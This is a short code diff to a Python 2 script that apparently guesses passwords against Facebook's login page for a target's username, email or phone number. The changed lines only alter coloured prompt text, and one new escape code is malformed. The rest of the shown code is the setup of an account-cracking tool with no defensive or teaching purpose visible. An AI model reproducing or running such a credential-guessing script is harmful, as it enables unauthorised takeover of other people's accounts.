@@ -11,7 +11,7 @@ import random
 email = str(raw_input("\033[1;96m[+] \033[1;93mTulis Username/Email/No HP target \033[1;97m: "))
 
 
-passwordlist = str(raw_input("\033[1;96m Tebak Passwod \033[1;97m: "))
+passwordlist = str(raw_input("\033[1;96m[+] \033[193mTebak Passwod \033[1;97m: "))
 
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
@@ -31,7 +31,7 @@ def main():
 	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 	welcome()
 	search()
-	print("Password does not exist in the wordlist")
+	print("\033[1;97mPassword does not exist in the wordlist")
 
 	
 	
